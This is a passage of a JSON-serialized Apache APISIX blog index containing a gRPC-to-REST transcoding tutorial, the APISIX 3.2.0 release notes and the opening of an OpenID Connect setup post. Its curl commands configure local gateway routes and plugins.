plugin](https://github.com/apache/apisix/pull/8959) (Contributor: [spacewander](https://github.com/spacewander))\\n\\n### Apache APISIX Ingress Controller\\n\\n- Add IngressClass support for custom resources of APISIX Ingress, allowing multiple sets of Ingress controllers to be deployed simultaneously in the same cluster and use custom resources.\\n\\nContributors\uff1a[AlinsRan](https://github.com/AlinsRan)\uff0c[lingsamuel](https://github.com/lingsamuel)\uff0c[Donghui0](https://github.com/Donghui0)\uff0crelated PR\uff1a\\n\\n- [feat: make multiple controllers handle different ApisixRoute CRDs](https://github.com/apache/apisix-ingress-controller/pull/593)\\n\\n- [feat: ApisixUpstream support IngressClass](https://github.com/apache/apisix-ingress-controller/pull/1674)\\n\\n- [feat: ApisixTls suuport ingressClass](https://github.com/apache/apisix-ingress-controller/pull/1714)\\n\\n- [feat: support ingressClass for ApisixPluginConfig](https://github.com/apache/apisix-ingress-controller/pull/1716)\\n\\n- [feat: ApisixConsumer support ingressClass](https://github.com/apache/apisix-ingress-controller/pull/1717)\\n\\n- [feat: support ingressClass for ApisixGlobalRule](https://github.com/apache/apisix-ingress-controller/pull/1718)\\n\\n- [feat: ApisixClusterConfig support IngressClass](https://github.com/apache/apisix-ingress-controller/pull/1720)\\n\\n## Recent Blog Recommendations\\n\\n- [Make your security policy auditable](https://apisix.apache.org/blog/2023/03/02/security-policy-auditable/)\\n\\n  This blog shows how you can leverage OPA and Apache APISIX to move your authentication and authorization logic from the code to the infrastructure. The former allows you to audit your security policies, the latter coherence among all your upstream across all tech stacks.\\n\\n- [The right feature at the right place](https://apisix.apache.org/blog/2023/01/18/consul-with-apisix/)\\n\\n  This blog takes the example of per-user rate limiting to show how one can implement it in a library and an infrastructure component. Then, the author generalized this example and gave a couple of guidelines.\\n\\n- [How to Integrate API Gateway and Consul? Not Consul K/V](https://apisix.apache.org/blog/2023/01/18/consul-with-apisix/)\\n\\n  Apache APISIX supports the Consul service discovery registry. This article will walk you through the process of implementing service discovery and service registry in Apache APISIX.\\n\\nA wealth of documentation tutorials and experience has been accumulated on the Apache APISIX official website and GitHub. If you encounter problems, you can look into the documentation, search keywords in the issues, or participate in the discussion on the issues, proposing your own ideas and practical experience."},{"id":"gRPC on the client side","metadata":{"permalink":"/blog/2023/03/16/grpc-client-side","source":"@site/blog/2023/03/16/grpc-client-side.md","title":"gRPC on the client side","description":"Most inter-systems communication components that use REST serialize their payload in JSON. As of now, JSON lacks a widely-used schema validation standard: JSON Schema is not widespread. Standard schema validation allows delegating the validation to a third-party library and being done with it. Without one, we must fall back to manual validation in the code. Worse, we must keep the validation code in sync with the schema. XML has schema validation out-of-the-box: an XML document can declare a grammar that it must conform to. SOAP, being based on XML, benefits from it too. Other serialization alternatives have a schema validation option: e.g., Avro, Kryo and Protocol Buffers. Interestingly enough, gRPC uses Protobuf to offer RPC across distributed components:\\n","date":"2023-03-16T00:00:00.000Z","formattedDate":"March 16, 2023","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":8.015,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"Biweekly Report (Feb 27 - Mar 12)","permalink":"/blog/2023/03/17/weekly-report-0312"},"nextItem":{"title":"Release Apache APISIX 3.2.0","permalink":"/blog/2023/03/10/release-apache-apisix-3.2.0"}},"content":">In this post, we will briefly describe gRPC and how it benefits inter-service communication.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/grpc-client-side/\\" />\\n</head>\\n\\nMost inter-systems communication components that use REST serialize their payload in JSON. As of now, JSON lacks a widely-used schema validation standard: [JSON Schema](https://json-schema.org/) is not widespread. Standard schema validation allows delegating the validation to a third-party library and being done with it. Without one, we must fall back to manual validation in the code. Worse, we must keep the validation code in sync with the schema.\\n\\nXML has schema validation out-of-the-box: an XML document can declare a grammar that it must conform to. SOAP, being based on XML, benefits from it too.\\n\\nOther serialization alternatives have a schema validation option: _e.g._, [Avro](https://avro.apache.org/), [Kryo](https://github.com/EsotericSoftware/kryo) and [Protocol Buffers](https://protobuf.dev/). Interestingly enough, gRPC uses Protobuf to offer RPC across distributed components:\\n\\ngRPC is a modern open source high performance Remote Procedure Call (RPC) framework that can run in any environment. It can efficiently connect services in and across data centers with pluggable support for load balancing, tracing, health checking and authentication. It is also applicable in last mile of distributed computing to connect devices, mobile applications and browsers to backend services. -- [Why gRPC?](https://grpc.io/)\\n\\nMoreover, Protocol is a _binary_ serialization mechanism, saving a lot of bandwidth. Thus, gRPC is an excellent option for inter-systems communication. But if all your components talk gRPC, how can simple clients call them? In this post, we will build a gRPC service and show how to call it from curl.\\n\\n## A simple gRPC service\\n\\nThe [gRPC documentation](https://grpc.io/docs/) is exhaustive, so here\'s a summary:\\n\\n* gRPC is a Remote Procedure Call framework\\n* It works across a wide range of languages\\n* It relies on Protocol Buffers:\\n\\n    >Protocol buffers are Google\u2019s language-neutral, platform-neutral, extensible mechanism for serializing structured data \u2013 think XML, but smaller, faster, and simpler. You define how you want your data to be structured once, then you can use special generated source code to easily write and read your structured data to and from a variety of data streams and using a variety of languages.\\n    >\\n    >-- [Protocol Buffers](https://protobuf.dev/)\\n\\n* It\'s part of the [CNCF](https://www.cncf.io/) portfolio and is currently in the incubation stage\\n\\nLet\'s set up our gRPC service. We will use Java, Kotlin, Spring Boot, and a dedicated gRPC Spring Boot integration project. The project structure holds two projects, one for the model and one for the code. Let\'s start with the model project.\\n\\nI didn\'t want something complicated; reusing a simple example is enough: the request sends a string, and the response prefixes it with `Hello`. We design this model in a dedicated Protobuf schema file:\\n\\n```proto\\nsyntax = \\"proto3\\";                                        //1\\n\\npackage ch.frankel.blog.grpc.model;                       //2\\n\\noption java_multiple_files = true;                        //3\\noption java_package = \\"ch.frankel.blog.grpc.model\\";       //3\\noption java_outer_classname = \\"HelloProtos\\";              //3\\n\\nservice HelloService {                                    //4\\n    rpc SayHello (HelloRequest) returns (HelloResponse) {\\n    }\\n}\\n\\nmessage HelloRequest {                                    //5\\n    string name = 1;                                      //6\\n}\\n\\nmessage HelloResponse {                                   //7\\n    string message = 1;                                   //6\\n}\\n```\\n\\n1. Protobuf definition version\\n2. Package\\n3. Java-specific configuration\\n4. Service definition\\n5. Request definition\\n6. Field definition. First comes the type, then the name, and finally, the order\\n7. Response definition\\n\\nWe shall use Maven to generate the Java boilerplate code:\\n\\n```xml\\n<project>\\n  <dependencies>\\n    <dependency>\\n      <groupId>io.grpc</groupId>                         \x3c!--1--\x3e\\n      <artifactId>grpc-stub</artifactId>\\n      <version>${grpc.version}</version>\\n    </dependency>\\n    <dependency>\\n      <groupId>io.grpc</groupId>                         \x3c!--1--\x3e\\n      <artifactId>grpc-protobuf</artifactId>\\n      <version>${grpc.version}</version>\\n    </dependency>\\n    <dependency>\\n      <groupId>jakarta.annotation</groupId>              \x3c!--1--\x3e\\n      <artifactId>jakarta.annotation-api</artifactId>\\n      <version>1.3.5</version>\\n      <optional>true</optional>\\n    </dependency>\\n  </dependencies>\\n  <build>\\n    <extensions>\\n      <extension>\\n        <groupId>kr.motd.maven</groupId>                 \x3c!--2--\x3e\\n        <artifactId>os-maven-plugin</artifactId>\\n        <version>1.7.1</version>\\n      </extension>\\n    </extensions>\\n    <plugins>\\n      <plugin>\\n        <groupId>org.xolstice.maven.plugins</groupId>    \x3c!--3--\x3e\\n        <artifactId>protobuf-maven-plugin</artifactId>\\n        <version>${protobuf-plugin.version}</version>\\n        <configuration>\\n          <protocArtifact>com.google.protobuf:protoc:${protobuf.version}:exe:${os.detected.classifier}</protocArtifact>\\n          <pluginId>grpc-java</pluginId>\\n          <pluginArtifact>io.grpc:protoc-gen-grpc-java:${grpc.version}:exe:${os.detected.classifier}</pluginArtifact>\\n        </configuration>\\n        <executions>\\n          <execution>\\n            <goals>\\n              <goal>compile</goal>\\n              <goal>compile-custom</goal>\\n            </goals>\\n          </execution>\\n        </executions>\\n      </plugin>\\n    </plugins>\\n  </build>\\n</project>\\n```\\n\\n1. Compile-time dependencies\\n2. Sniff information about the Operating System. Used in the next plugin\\n3. Generate Java code from the `proto` file\\n\\nAfter compilation, the structure should look something like the following:\\n\\n![Proto model project structure](https://static.apiseven.com/uploads/2023/06/08/JkWtxWqP_model.jpeg)\\n\\nWe can package the classes in a JAR and use it in a web app project. The latter is in Kotlin, but only because it\'s my favourite JVM language.\\n\\nWe only need a specific Spring Boot starter dependency to integrate gRPC endpoints with Spring Boot:\\n\\n```xml\\n<dependency>\\n  <groupId>net.devh</groupId>\\n  <artifactId>grpc-server-spring-boot-starter</artifactId>\\n  <version>2.14.0.RELEASE</version>\\n</dependency>\\n```\\n\\nHere\'s the significant bit:\\n\\n```java\\n@GrpcService                                                        //1\\nclass HelloService : HelloServiceImplBase() {                       //2\\n  override fun sayHello(\\n      request: HelloRequest,                                        //2\\n      observer: StreamObserver<HelloResponse>                       //3\\n  ) {\\n    with(observer) {\\n      val reply = HelloResponse.newBuilder()                        //2\\n                               .setMessage(\\"Hello ${request.name}\\") //4\\n                               .build()\\n      onNext(reply)                                                 //5\\n      onCompleted()                                                 //5\\n    }\\n  }\\n}\\n```\\n\\n1. The `grpc-server-spring-boot-starter` detects the annotation and works its magic\\n2. Reference classes generated in the above project\\n3. The method signature allows a `StreamObserver` parameter. The class comes from `grpc-stub.jar`\\n4. Get the request and prefix it to build the response message\\n5. Play the events\\n\\nWe can now start the web app with `./mvnw spring-boot:run`.\\n\\n## Testing the gRPC service\\n\\nThe whole idea behind the post is that accessing the gRPC service with regular tools is impossible. To test, we need a dedicated tool nonetheless. I found [grpcurl](https://github.com/fullstorydev/grpcurl). Let\'s install it and use it to list available services:\\n\\n```bash\\ngrpcurl --plaintext localhost:9090 list   #1-2\\n```\\n\\n1. List all available gRPC services **without** TLS verification\\n2. To avoid clashes between gRPC and other channels, _e.g._, REST, Spring Boot uses another port\\n\\n```\\nch.frankel.blog.grpc.model.HelloService   #1\\ngrpc.health.v1.Health                     #2\\ngrpc.reflection.v1alpha.ServerReflection  #2\\n```\\n\\n1. The gRPC service we defined\\n2. Two additional services provided by the custom starter\\n\\nWe can also dive into the structure of the service:\\n\\n```bash\\ngrpcurl --plaintext localhost:9090 describe ch.frankel.blog.grpc.model.HelloService\\n```\\n\\n```\\nservice HelloService {\\n  rpc SayHello ( .ch.frankel.blog.grpc.model.HelloRequest ) returns ( .ch.frankel.blog.grpc.model.HelloResponse );\\n}\\n```\\n\\nFinally, we can call the service with data:\\n\\n```bash\\ngrpcurl --plaintext -d \'{\\"name\\": \\"John\\"}\' localhost:9090 ch.frankel.blog.grpc.model.HelloService/SayHello\\n```\\n\\n```json\\n{\\n  \\"message\\": \\"Hello John\\"\\n}\\n```\\n\\n## Accessing the gRPC service with regular tools\\n\\nImagine that we have a regular JavaScript client-side application that needs to access the gRPC service. What would be the alternatives?\\n\\nThe general approach is through `grpc-web`:\\n\\n>A JavaScript implementation of gRPC for browser clients. For more information, including a quick start, see the gRPC-web documentation.\\n>\\n>gRPC-web clients connect to gRPC services via a special proxy; by default, gRPC-web uses Envoy.\\n>\\n>In the future, we expect gRPC-web to be supported in language-specific web frameworks for languages such as Python, Java, and Node. For details, see the roadmap.\\n>\\n>-- [grpc-web](https://github.com/grpc/grpc-web)\\n\\nThe description states a single limitation: it works only for JavaScript (as of now). However, there\'s another one. It\'s pretty intrusive. You need to get the `proto` file, generate boilerplate code, and make your code call it. You must do it for every client type. Worse, if the proto file changes, you need to regenerate the client code in each of them.\\n\\nAn alternative exists, though, if you\'re using an API Gateway. I\'ll describe how to do it with [Apache APISIX](https://apisix.apache.org/), but perhaps other gateways can do the same. [grpc-transcode](https://apisix.apache.org/docs/apisix/plugins/grpc-transcode/) is a plugin that allows transcoding REST calls to gRPC and back again.\\n\\nThe first step is to register the proto file in Apache APISIX:\\n\\n```bash\\ncurl http://localhost:9180/apisix/admin/protos/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \\"{ \\\\\\"content\\\\\\": \\\\\\"$(sed \'s/\\"/\\\\\\\\\\"/g\' ../model/src/main/proto/model.proto)\\\\\\" }\\"\\n```\\n\\nThe second step is to create a route with the above plugin:\\n\\n```bash\\ncurl http://localhost:9180/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n  \\"uri\\": \\"/helloservice/sayhello\\",                           #1\\n  \\"plugins\\": {\\n    \\"grpc-transcode\\": {\\n      \\"proto_id\\": \\"1\\",                                       #2\\n      \\"service\\": \\"ch.frankel.blog.grpc.model.HelloService\\",  #3\\n      \\"method\\": \\"SayHello\\"                                   #4\\n    }\\n  },\\n  \\"upstream\\": {\\n    \\"scheme\\": \\"grpc\\",\\n    \\"nodes\\": {\\n      \\"server:9090\\": 1\\n    }\\n  }\\n}\'\\n```\\n\\n1. Define a granular route\\n2. Reference the proto file defined in the previous command\\n3. gRPC service\\n4. gRPC method\\n\\nAt this point, **any client** can make an HTTP request to the defined endpoint. Apache APISIX will transcode the call to gRPC, forward it to the defined service, get the response, and transcode it again.\\n\\n```bash\\ncurl localhost:9080/helloservice/sayhello?name=John\\n```\\n\\n```json\\n{\\"message\\":\\"Hello John\\"}\\n```\\n\\nCompared to `grpc-web`, the API Gateway approach allows sharing the `proto` file with a single component: the Gateway itself.\\n\\n## Benefits of transcoding\\n\\nAt this point, we can leverage the capabilities of the API Gateway. Imagine we want a default value if no `name` is passed, _e.g._, `World`. Developers would happily set it in the code, but any change to the value would require a complete build and deployment. Changes can be nearly-instant if we put the default value in the Gateway\'s routes processing chain. Let\'s change our route accordingly:\\n\\n```bash\\ncurl http://localhost:9180/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n  \\"uri\\": \\"/helloservice/sayhello\\",\\n  \\"plugins\\": {\\n    \\"grpc-transcode\\": {\\n      ...\\n    },\\n    \\"serverless-pre-function\\": {                    #1\\n      \\"phase\\": \\"rewrite\\",                           #2\\n      \\"functions\\" : [\\n        \\"return function(conf, ctx)                 #3\\n          local core = require(\\\\\\"apisix.core\\\\\\")\\n          if not ngx.var.arg_name then\\n            local uri_args = core.request.get_uri_args(ctx)\\n            uri_args.name = \\\\\\"World\\\\\\"\\n            ngx.req.set_uri_args(uri_args)\\n          end\\n        end\\"\\n      ]\\n    }\\n  },\\n  \\"upstream\\": {\\n      ...\\n  }\\n}\'\\n```\\n\\n1. Generic all-purpose plugin when none fits\\n2. Rewrite the request\\n3. Magic Lua code that does the trick\\n\\nNow, we can execute the request with an empty argument and get the expected result:\\n\\n```bash\\ncurl localhost:9080/helloservice/sayhello?name\\n```\\n\\n```json\\n{\\"message\\":\\"Hello World\\"}\\n```\\n\\n## Conclusion\\n\\nIn this post, we have briefly described gRPC and how it benefits inter-service communication. We developed a simple gRPC service using Spring Boot and `grpc-server-spring-boot-starter`. It comes at a cost, though: regular clients cannot access the service. We had to resort to `grpcurl` to test it. The same goes for clients based on JavaScript - or the browser.\\n\\nTo bypass this limitation, we can leverage an API Gateway. I demoed how to configure Apache APISIX with the `grpc-transcode` plugin to achieve the desired result.\\n\\nThe complete source code for this post can be found on [GitHub](https://github.com/ajavageek/grpc-apisix).\\n\\n**To go further:**\\n\\n* [gRPC](https://grpc.io/)\\n* [Protocol Buffers](https://protobuf.dev/)\\n* [os-maven-plugin](https://github.com/trustin/os-maven-plugin)\\n* [Maven Protocol Buffers Plugin](https://github.com/xolstice/protobuf-maven-plugin)\\n* [gRPC-Spring-Boot-Starter](https://yidongnan.github.io/grpc-spring-boot-starter/)\\n* [grpcurl](https://github.com/fullstorydev/grpcurl)\\n* [Apache APISIX](https://apisix.apache.org)\\n* [grpc-transcode plugin](https://apisix.apache.org/docs/apisix/plugins/grpc-transcode/)"},{"id":"Release Apache APISIX 3.2.0","metadata":{"permalink":"/blog/2023/03/10/release-apache-apisix-3.2.0","source":"@site/blog/2023/03/10/release-apache-apisix-3.2.0.md","title":"Release Apache APISIX 3.2.0","description":"As the first LTS version since the 3.0 version, APISIX 3.2.0 is officially released!","date":"2023-03-10T00:00:00.000Z","formattedDate":"March 10, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":4.33,"truncated":true,"authors":[{"name":"Zexuan Luo","title":"Author","url":"https://github.com/spacewander","image_url":"https://github.com/spacewander.png","imageURL":"https://github.com/spacewander.png"},{"name":"Yilia","title":"Technical Writer","url":"https://github.com/Yilialinn","image_url":"https://avatars.githubusercontent.com/u/114121331?v=4","imageURL":"https://avatars.githubusercontent.com/u/114121331?v=4"}],"prevItem":{"title":"gRPC on the client side","permalink":"/blog/2023/03/16/grpc-client-side"},"nextItem":{"title":"Authenticate with OpenID Connect and Apache APISIX","permalink":"/blog/2023/03/09/authenticate-openid-connect"}},"content":"> As the first LTS version since the 3.0 version, APISIX 3.2.0 is officially released! This release is a significant milestone for the 3.x era to replace the 2.x era.\\n\\n\x3c!--truncate--\x3e\\n\\nA new series of patch versions will be released based on the 3.2.0 version. As usual, many features and plugins are added to optimize the experience of using APISIX.\\n\\n## New feature: service discovery on Layer 4\\n\\nOnly a few gateways support service discovery, and APISIX is one of them. In version 3.2.0, APISIX implemented the service discovery on Layer 4. In this way, you can also enjoy the convenience of service discovery when using APISIX as a TCP/UDP proxy. Like the service discovery on Layer 7, we need to configure the address of the service discovery server in `config.yaml` if we want to use service discovery:\\n\\n```\\ndiscovery:\\n  nacos:\\n    host:\\n      - \\"http://192.168.33.1:8848\\"\\n```\\n\\nThen configure `discovery_type` and `service_name` on the specific upstream:\\n\\n```\\n$ curl http://127.0.0.1:9180/apisix/admin/stream_routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -i -d \'\\n{\\n    \\"remote_addr\\": \\"127.0.0.1\\",\\n    \\"upstream\\": {\\n        \\"scheme\\": \\"tcp\\",\\n        \\"discovery_type\\": \\"nacos\\",\\n        \\"service_name\\": \\"APISIX-NACOS\\",\\n        \\"type\\": \\"roundrobin\\"\\n    }\\n}\'\\n```\\n\\nIn this way, when accessing stream_routes, the upstream node will obtain it from the APISIX-NACOS service of Nacos.\\n\\n## New plugin: RESTful request to GraphQL\\n\\nIn version 3.2.0, APISIX added a plugin that converts RESTful requests into GraphQL. For example, suppose you have a GraphQL query like this:\\n\\n```\\nquery($name: String!, $githubAccount: String!) {\\n  persons(filter: { name: $name, githubAccount: $githubAccount }) {\\n    id\\n    name\\n    blog\\n    githubAccount\\n    talks {\\n      id\\n      title\\n    }\\n  }\\n}\\n```\\n\\n$name and $githubAccount are two GraphQL variables in this code segment.\\n\\nWe can expose the same RESTful interface with the following configuration:\\n\\n```\\ncurl --location --request PUT \'http://localhost:9180/apisix/admin/routes/1\' \\\\\\n--header \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' \\\\\\n--header \'Content-Type: application/json\' \\\\\\n--data-raw \'{\\n    \\"uri\\": \\"/graphql\\",\\n    \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n            \\"127.0.0.1:8080\\": 1\\n        }\\n    },\\n    \\"plugins\\": {\\n        \\"degraphql\\": {\\n            \\"query\\": \\"query($name: String!, $githubAccount: String!) {\\\\n  persons(filter: { name: $name, githubAccount: $githubAccount }) {\\\\n    id\\\\n    name\\\\n    blog\\\\n    githubAccount\\\\n    talks {\\\\n      id\\\\n      title\\\\n    }\\\\n  }\\\\n}\\",\\n            \\"variables\\": [\\n                \\"name\\",\\n                \\"githubAccount\\"\\n            ]\\n        }\\n    }\\n}\'\\n```\\n\\nHere `query` is the query statement we want to use, and `variables` is the list of variables declared in advance.\\n\\nIt can then be accessed as a RESTful interface:\\n\\n```\\ncurl --location --request POST \'http://localhost:9080/graphql\' \\\\\\n--header \'Content-Type: application/json\' \\\\\\n--data-raw \'{\\n    \\"name\\": \\"Niek\\",\\n    \\"githubAccount\\": \\"npalm\\"\\n}\'\\n```\\n\\nThe result is the same as accessing upstream directly with the corresponding GraphQL statement:\\n\\n```\\n{\\n  \\"data\\": {\\n    \\"persons\\": [\\n      {\\n        \\"id\\": \\"7\\",\\n        \\"name\\": \\"Niek\\",\\n        \\"blog\\": \\"https://040code.github.io\\",\\n        \\"githubAccount\\": \\"npalm\\",\\n        \\"talks\\": [\\n          {\\n            \\"id\\": \\"19\\",\\n            \\"title\\": \\"GraphQL - The Next API Language\\"\\n          },\\n          {\\n            \\"id\\": \\"20\\",\\n            \\"title\\": \\"Immutable Infrastructure\\"\\n          }\\n        ]\\n      }\\n    ]\\n  }\\n}\\n```\\n\\nYou can also use the GET request to access the same interface, then the parameters need to be passed through the query string:\\n\\n```\\ncurl \'http://localhost:9080/graphql?name=Niek&githubAccount=npalm\'\\n```\\n\\n## New feature: support for setting log format on each log plugin\\n\\nIn version 3.2.0, we sorted out more than ten existing access log plugins of APISIX. Each plugin now supports configuring custom log formats:\\n\\n1. Define the global log format in the plugin metadata\\n\\n2. Define the log format of the current route in the configuration of the plugin on the specific routing rule\\n\\nTake clickhouse-logger as an example,\\nHere\'s how to define a global log format:\\n\\n```\\ncurl http://127.0.0.1:9180/apisix/admin/plugin_metadata/clickhouse-logger \\\\\\n-H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"log_format\\": {\\n        \\"host\\": \\"$host\\",\\n        \\"@timestamp\\": \\"$time_iso8601\\",\\n        \\"client_ip\\": \\"$remote_addr\\"\\n    }\\n}\'\\n```\\n\\nThe following is the log format of the current route:\\n\\n```\\ncurl http://127.0.0.1:9180/apisix/admin/routes/1 \\\\\\n-H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n      \\"plugins\\": {\\n            \\"clickhouse-logger\\": {\\n                \\"log_format\\": {\\n                    \\"host\\": \\"$host\\",\\n                    \\"@timestamp\\": \\"$time_iso8601\\",\\n                    \\"client_ip\\": \\"$remote_addr\\"\\n                },\\n                \\"user\\": \\"default\\",\\n                \\"password\\": \\"a\\",\\n                \\"database\\": \\"default\\",\\n                \\"logtable\\": \\"test\\",\\n                \\"endpoint_addrs\\": [\\"http://127.0.0.1:8123\\"]\\n            }\\n       },\\n      \\"upstream\\": {\\n           \\"type\\": \\"roundrobin\\",\\n           \\"nodes\\": {\\n               \\"127.0.0.1:1980\\": 1\\n           }\\n      },\\n      \\"uri\\": \\"/hello\\"\\n}\'\\n\\n```\\n\\n## New plugin: request body/response body conversion\\n\\nAre you struggling with how to introduce ancient upstream services that return XML to modern clients that only accept JSON? The new body-transformer plugin in 3.2.0 is open source to solve this problem.\\n\\nThe body-transformer plugin supports conversion between JSON and XML. But that\'s not the only thing it can do. It also supports configuring the specific format of the input and output content through templates. For example,\\n\\nSuppose you have the following JSON template: `{\\"foo\\":\\"{{name .. \\" world\\"}}\\", \\"bar\\":{{age+10}}}`, and configure it to the `body-transformer` plugin in the `request.template` field:\\n\\n```\\n    ...\\n    \\"body-transformer\\": {\\n        \\"request\\": {\\n            \\"template\\": \\"...\\"\\n        }\\n    }\\n    ...\\n```\\n\\nThen when the request content is `{\\"name\\":\\"hello\\",\\"age\\":20}`, the rewritten `{\\"foo\\":\\"hello world\\",\\"bar\\":30}` is sent to the upstream. We use `lua-resty-template` to render templates, so you can embed Lua expressions in templates to implement rewriting logic.\\n\\nThe rewriting of upstream output is similar, except that the `response.template` field of the plugin needs to be configured.\\n\\n## More new features: optimizations and more small features\\n\\nIn addition to the several big features mentioned above, this release contains several changes worth mentioning.\\n\\n* The error-log-logger plugin supports sending error logs to Kafka\\n\\n* The limit-count plugin supports returning the X-RateLimit-Reset response header\\n\\nIf you are interested in the full update details of the new release, please refer to the [CHANGELOG](https://github.com/apache/apisix/blob/master/CHANGELOG.md) of the 3.2.0 release."},{"id":"Authenticate with OpenID Connect and Apache APISIX","metadata":{"permalink":"/blog/2023/03/09/authenticate-openid-connect","source":"@site/blog/2023/03/09/authenticate-openid-connect.md","title":"Authenticate with OpenID Connect and Apache APISIX","description":"Lots of companies are eager to provide their identity provider: Twitter, Facebook, Google, etc. For smaller businesses, not having to manage identities is a benefit. However, we want to avoid being locked into one provider. In this post, I want to demo how to use OpenID Connect using Google underneath and then switch to Azure.\\n","date":"2023-03-09T00:00:00.000Z","formattedDate":"March 9, 2023","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":5.615,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"Release Apache APISIX 3.2.0","permalink":"/blog/2023/03/10/release-apache-apisix-3.2.0"},"nextItem":{"title":"Make your security policy auditable","permalink":"/blog/2023/03/02/security-policy-auditable"}},"content":">Lots of companies are eager to provide their identity provider: Twitter, Facebook, Google, etc. For smaller businesses, not having to manage identities is a benefit. However, we want to avoid being locked into one provider. In this post, I want to demo how to use OpenID Connect using Google underneath and then switch to Azure.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/authenticate-openid-connect/\\" />\\n</head>\\n\\n## OpenID Connect\\n\\nThe idea of an _authorization_ open standard started with [OAuth](https://en.wikipedia.org/wiki/OAuth) around 2006. Because of a security issue, OAuth 2.0 superseded the initial version. OAuth 2.0 became an <abbr title=\\"Internet Engineering Task Force\\">IETF</abbr> <abbr title=\\"Request For Comments\\">RFC</abbr> in 2012:\\n\\n>The OAuth 2.0 authorization framework enables a third-party\\n>application to obtain limited access to an HTTP service, either on\\n>behalf of a resource owner by orchestrating an approval interaction\\n>between the resource owner and the HTTP service, or by allowing the\\n>third-party application to obtain access on its own behalf\\n>\\n>-- [RFC 7469 - The OAuth 2.0 Authorization Framework](https://www.rfc-editor.org/rfc/rfc6749)\\n\\nOAuth focuses mostly on _authorization_;\\nthe _authentication_ part is pretty light:\\nit contains a section about Client Password authentication and one Other Authentication Methods.\\n\\n>The authorization server MAY support any suitable HTTP authentication\\n>scheme matching its security requirements.  When using other\\n>authentication methods, the authorization server MUST define a\\n>mapping between the client identifier (registration record) and\\n>authentication scheme.\\n>\\n>-- [2.3.2.  Other Authentication Methods](https://www.rfc-editor.org/rfc/rfc6749#section-2.3.2)\\n\\nOpenID Connect uses OAuth 2.0 and adds the _authentication_ part:\\n\\n>OpenID Connect 1.0 is a simple identity layer on top of the OAuth 2.0 protocol. It allows Clients to verify the identity of the End-User based on the authentication performed by an Authorization Server, as well as to obtain basic profile information about the End-User in an interoperable and REST-like manner.\\n>\\n>OpenID Connect allows clients of all types, including Web-based, mobile, and JavaScript clients, to request and receive information about authenticated sessions and end-users. The specification suite is extensible, allowing participants to use optional features such as encryption of identity data, discovery of OpenID Providers, and logout, when it makes sense for them.\\n>\\n>-- [What is OpenID Connect?](https://openid.net/connect/)\\n\\nHere are a couple of identity providers that are compatible with OpenID Connect:\\n\\n* GitHub\\n* Google\\n* Microsoft\\n* Apple\\n* Facebook\\n* Twitter\\n* Spotify\\n\\nIn the following, we will start with Google and switch to Azure to validate our setup.\\n\\n## Setting up OpenID Connect with Apache APISIX\\n\\nImagine we have a web app behind Apache APISIX that we want to secure with OpenID Connect. Here\'s the corresponding Docker Compose file:\\n\\n```yaml\\nversion: \\"3\\"\\n\\nservices:\\n  apisix:\\n    image: apache/apisix:3.1.0-debian                              #1\\n    ports:\\n      - \\"9080:9080\\"\\n    volumes:\\n      - ./apisix/config.yml:/usr/local/apisix/conf/config.yaml:ro  #2\\n      - ./apisix/apisix.yml:/usr/local/apisix/conf/apisix.yaml:ro  #3\\n    env_file:\\n      - .env\\n  httpbin:\\n    image: kennethreitz/httpbin                                    #4\\n```\\n\\n1. Apache APISIX API Gateway\\n2. APISIX configuration - used to configure it statically in the following line\\n3. Configure the single route\\n4. Webapp to protect. Any will do\\n\\nApache APISIX offers a plugin-based architecture. One such plugin is the [openid-connect](https://apisix.apache.org/docs/apisix/plugins/openid-connect/) plugin, which allows using OpenID Connect.\\n\\nLet\'s configure it:\\n\\n```yaml\\nroutes:\\n  - uri: /*                                                                    #1\\n    upstream:\\n      nodes:\\n        \\"httpbin:80\\": 1                                                        #1\\n    plugins:\\n      openid-connect:\\n        client_id: ${{OIDC_CLIENTID}}                                          #2\\n        client_secret: ${{OIDC_SECRET}}                                        #2\\n        discovery: https://${{OIDC_ISSUER}}/.well-known/openid-configuration   #2-3\\n        redirect_uri: http://localhost:9080/callback                           #4\\n        scope: openid                                                          #5\\n        session:\\n          secret: ${{SESSION_SECRET}}                                          #6\\n#END\\n```\\n\\n1. Catch-all route to the underlying web app\\n2. Plugin configuration parameters. Values depend on the exact provider (see below)\\n3. OpenID Connect can use a Discovery endpoint to get all necessary OAuth endpoints. See [OpenID Connect Discovery 1.0 spec](https://openid.net/specs/openid-connect-discovery-1_0.html#ProviderConfig) for more information\\n4. Where to redirect when the authentication is successful. It mustn\'t clash with any of the explicitly defined routes. The plugin creates a dedicated route there to work its magic.\\n5. Default scope\\n6. Key to encrypt session data. Put whatever you want.\\n\\n## Configuring Google for OIDC\\n\\nLike all Cloud Providers, Google offers a full-fledged Identity Management solution, which may be daunting for newcomers. In this section, I\'ll only detail the necessary steps required to configure it for <abbr title=\\"OpenID Connect\\">OIDC</abbr>.\\n\\nOn the [Cloud Console](https://console.cloud.google.com/), create a dedicated project (or use an existing one).\\n\\nIf you didn\'t do it already, customize the [OAuth 